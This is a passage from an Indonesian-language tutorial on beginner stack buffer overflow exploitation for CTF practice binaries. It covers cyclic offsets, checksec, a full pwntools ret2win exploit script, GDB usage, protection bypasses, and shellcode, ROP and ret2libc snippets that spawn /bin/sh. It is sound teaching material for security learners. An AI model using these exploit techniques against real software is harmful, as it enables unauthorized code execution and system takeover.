│   3. Cari Alamat Target                   │
│      (Fungsi rahasia / Shellcode / Win)   │
└────────────────────┬──────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────┐    ← Pastikan Endianness
│   4. Kirim Payload                        │       (Little Endian) benar
│      [ Padding ] + [ Alamat Target ]      │
└────────────────────┬──────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────┐
│   5. Program Redirect ke Target!          │
│         EXPLOIT SUCCESS 🎉               │
└───────────────────────────────────────────┘
```

---

## 3.7 Menghitung Offset dengan Cyclic Pattern

Untuk mengetahui **berapa byte yang dibutuhkan sebelum return address** (disebut "offset"), kita menggunakan teknik cyclic pattern dari pwntools.

### Langkah 1: Generate Pattern Unik

```python
from pwn import *

# Generate pattern unik 200 byte
pattern = cyclic(200)
print(pattern)
# aaaabaaacaaadaaaeaaafaaag...
```

### Langkah 2: Kirim Pattern ke Program

Kirimkan pattern tersebut sebagai input ke program. Program akan crash karena mencoba melompat ke alamat yang tidak valid.

### Langkah 3: Lihat Nilai RIP Saat Crash

Di GDB, setelah crash, periksa nilai register RIP:
```
pwndbg> info reg rip
rip    0x6161616c
```

### Langkah 4: Hitung Offset

```python
offset = cyclic_find(0x6161616c)  # nilai dari RIP
print(offset)  # → 76 (misalnya)
```

**Hasil:** Diketahui bahwa setelah menulis **76 byte padding**, byte berikutnya akan menimpa return address.

> **Catatan:** Nilai offset ini bervariasi tergantung ukuran buffer dan variabel lokal lain di dalam fungsi yang bersangkutan.

---

## 3.8 Memeriksa Proteksi Binary dengan checksec

Sebelum mulai mengeksploitasi, **selalu periksa proteksi** yang aktif pada binary target:

```bash
checksec --file=./vuln
```

Contoh output ideal untuk pemula:
```
Arch:    amd64-64-little
RELRO:   Partial RELRO
Stack:   No canary found    ← bagus, tidak ada proteksi stack canary
NX:      NX disabled        ← bisa menjalankan shellcode di stack
PIE:     No PIE             ← alamat fungsi tetap, tidak diacak
```

> **Jika semua proteksi mati = kondisi ideal untuk pemula.** Semakin banyak proteksi yang aktif, semakin kompleks exploit yang dibutuhkan.

---

## 3.9 Cara Mendapatkan Alamat Fungsi Target

Setelah mengetahui offset, kita perlu tahu alamat fungsi yang ingin dipanggil. Ada tiga cara:

### Cara 1: Menggunakan `objdump`

```bash
objdump -d ./vuln | grep -A5 "rahasia"
# 0000000000401196 <rahasia>:
```

### Cara 2: Menggunakan GDB

```bash
gdb ./vuln
(gdb) info functions        # tampilkan semua fungsi
(gdb) p rahasia             # print alamat fungsi rahasia
```

### Cara 3: Menggunakan pwntools

```python
elf = ELF('./vuln')
print(hex(elf.symbols['rahasia']))
# → 0x401196
```

> **Catatan:** Ketiga cara ini hanya berlaku jika **PIE (Position Independent Executable) dinonaktifkan** — artinya alamat fungsi tidak diacak setiap kali program dijalankan.

---

## 3.10 Menulis Exploit Pertama dengan pwntools

Berikut adalah script exploit lengkap untuk kasus sederhana (tanpa proteksi):

```python
from pwn import *

# 1. Jalankan program target
p = process('./vuln')

# 2. Tentukan offset dan alamat target
offset = 76                  # hasil dari cyclic_find
ret_addr = 0x401196          # alamat fungsi rahasia()
# cari dengan: objdump -d vuln | grep rahasia

# 3. Buat payload
payload = b'A' * offset       # padding — mengisi buffer hingga return address
payload += p64(ret_addr)      # timpa return address dengan alamat target (little-endian)

# 4. Kirim payload
p.sendline(payload)
p.interactive()               # ambil alih terminal
```

**Penjelasan baris per baris:**

| Baris | Penjelasan |
|-------|-----------|
| `process('./vuln')` | Menjalankan program target secara lokal |
| `b'A' * offset` | Membuat 76 byte padding untuk mengisi buffer hingga posisi return address |
| `p64(ret_addr)` | Mengubah alamat menjadi format 8-byte little-endian yang benar |
| `p.sendline(payload)` | Mengirimkan payload ke stdin program |
| `p.interactive()` | Memberikan kendali terminal kepada pengguna setelah exploit berhasil |

**Jalankan exploit:**
```bash
python3 exploit.py
# Output: Selamat! Lo masuk fungsi rahasia!
```

---

## 3.11 Debugging dengan GDB + pwndbg

pwndbg adalah plugin GDB yang sangat membantu untuk analisis binary. Berikut perintah-perintah yang paling sering digunakan:

```bash
# Memulai sesi debug
gdb ./vuln

# Perintah di dalam GDB + pwndbg:
pwndbg> run               # jalankan program
pwndbg> break login       # set breakpoint di awal fungsi login
pwndbg> stack 20          # tampilkan isi stack 20 baris ke atas dari RSP
pwndbg> info reg          # tampilkan semua nilai register
pwndbg> x/20x $rsp        # examine memory: tampilkan 20 hex dari RSP
pwndbg> disas login       # tampilkan assembly fungsi login
pwndbg> continue          # lanjutkan eksekusi hingga breakpoint berikutnya
pwndbg> ni                # next instruction (satu langkah, tanpa masuk ke fungsi)
pwndbg> si                # step instruction (satu langkah, masuk ke dalam fungsi)
```

> **Tips utama:** Ketika program crash, segera periksa nilai register `RIP`. Nilai tersebut adalah bagian dari cyclic pattern yang kita kirim, dan itulah yang dimasukkan ke `cyclic_find()` untuk mendapatkan offset.

---

## 3.12 Little Endian — Hal yang Sering Terlupakan

Arsitektur x86-64 menggunakan format penyimpanan **Little Endian**, artinya byte dengan nilai paling kecil (least significant byte) disimpan **terlebih dahulu** di memory.

**Contoh:**

```
Alamat fungsi: 0x0000000000401196

Representasi di memory (little-endian):
  \x96 \x11 \x40 \x00 \x00 \x00 \x00 \x00
   ↑ byte pertama yang disimpan (nilai terkecil)
```

**Konsekuensi dalam exploit:**

```python
# ❌ SALAH — urutan big-endian
payload += b'\x00\x00\x00\x00\x00\x40\x11\x96'

# ✅ BENAR — gunakan p64() dari pwntools, otomatis menangani endianness
payload += p64(0x401196)
```

Fungsi `p64()` dari pwntools secara otomatis mengubah alamat 64-bit ke format little-endian yang benar. Jangan pernah menulis byte alamat secara manual kecuali benar-benar memahami urutannya.

---

## 3.13 Proteksi Binary dan Cara Melewatinya

Seiring dengan meningkatnya level kesulitan soal, berbagai proteksi keamanan akan aktif. Berikut penjelasan lengkapnya:

| Proteksi | Fungsinya | Cara Bypass |
|----------|-----------|-------------|
| **Stack Canary** | Nilai acak ditempatkan sebelum return address. Program memeriksa apakah nilainya berubah sebelum melakukan `ret`. Jika berubah, program langsung crash. | Perlu **membocorkan (leak) nilai canary** terlebih dahulu, kemudian menyertakannya dalam payload agar pemeriksaan lolos. |
| **NX / DEP** | Stack ditandai sebagai non-executable, sehingga kode shellcode yang ditaruh di stack tidak dapat dieksekusi oleh CPU. | Menggunakan teknik **ROP (Return-Oriented Programming)** — memanfaatkan potongan kode yang sudah ada di binary. |
| **ASLR** | Merandominasi alamat memory setiap kali program dijalankan, sehingga alamat stack, heap, dan library berubah terus. | Perlu **membocorkan alamat runtime** terlebih dahulu (melalui format string bug atau info leak lainnya) sebelum menghitung offset. |
| **PIE** | Merandominasi **base address dari binary itu sendiri**, sehingga alamat fungsi-fungsi di dalam binary juga berubah. | Sama seperti ASLR — butuh **info leak** untuk mengetahui base address saat runtime. |
| **RELRO** | Melindungi **GOT (Global Offset Table)** dari penulisan ilegal. Full RELRO membuat GOT read-only. | **Partial RELRO** masih bisa dilewati dengan GOT overwrite. **Full RELRO** membutuhkan teknik lain. |

**Tingkat kesulitan berdasarkan proteksi yang aktif:**

```
Level 1 (Pemula):    Semua proteksi mati → Ret2Win klasik
Level 2:             NX aktif            → ROP chains
Level 3:             NX + ASLR aktif     → ROP + info leak
Level 4:             NX + ASLR + Canary  → Leak canary + ROP
Level 5 (Expert):    Semua aktif         → Teknik lanjutan
```

---

## 3.14 Langkah Selanjutnya (Next Level)

Setelah menguasai buffer overflow dasar (ret2win), berikut adalah teknik-teknik lanjutan yang dapat dipelajari:

### Shellcoding
Menulis kode mesin (shellcode) sendiri dan menyuntikkannya ke dalam program target untuk dieksekusi. Dibutuhkan ketika tidak ada fungsi "target" yang sudah ada di binary.

```python
# Contoh shellcode untuk membuka shell (/bin/sh)
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'\x90') + p64(ret_to_shellcode_addr)
```

### ROP Chains (Return-Oriented Programming)
Teknik untuk melewati proteksi NX dengan cara menyusun "rantai" dari potongan-potongan kode yang sudah ada di binary (disebut "gadget"). Setiap gadget berakhir dengan instruksi `ret`.

```python
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # contoh: leak alamat puts
```

### ret2libc
Teknik yang memanfaatkan fungsi-fungsi dari C standard library (libc), khususnya `system("/bin/sh")`, untuk mendapatkan shell. Teknik ini berguna ketika NX aktif dan tidak ada fungsi "target" di binary.

```python
# Prinsip dasar ret2libc
# 1. Leak alamat fungsi libc (misal: puts atau printf)
# 2. Hitung base address libc
# 3. Hitung alamat system() dan string "/bin/sh"
# 4. Panggil system("/bin/sh")
```

---

## 3.15 Referensi dan Sumber Belajar

### Platform Latihan Langsung

| Platform | URL | Keterangan |
|----------|-----|------------|
| **pwn.college** | pwn.college | Gratis, terstruktur, ada sistem hint bertahap |
| **PicoCTF** | picoctf.com | Kategori Binary Exploitation tersedia, cocok untuk pemula |
| **pwnable.kr** | pwnable.kr | Level dari menengah hingga sangat sulit |
| **HackTheBox** | hackthebox.com | Tantangan PWN yang beragam |

### Buku Referensi

- **"Hacking: The Art of Exploitation"** — Jon Erickson  
  Buku klasik yang membahas buffer overflow, shellcoding, dan teknik eksploitasi dasar secara mendalam.

### Konten Video

- **LiveOverflow** (YouTube) — Penjelasan visual yang sangat membantu untuk memahami konsep teknis, mulai dari dasar hingga tingkat lanjut.

### Dokumentasi Tools

- **pwntools docs:** docs.pwntools.com — Referensi lengkap untuk semua fungsi pwntools
- **GDB Documentation:** sourceware.org/gdb/documentation — Manual resmi GDB

---

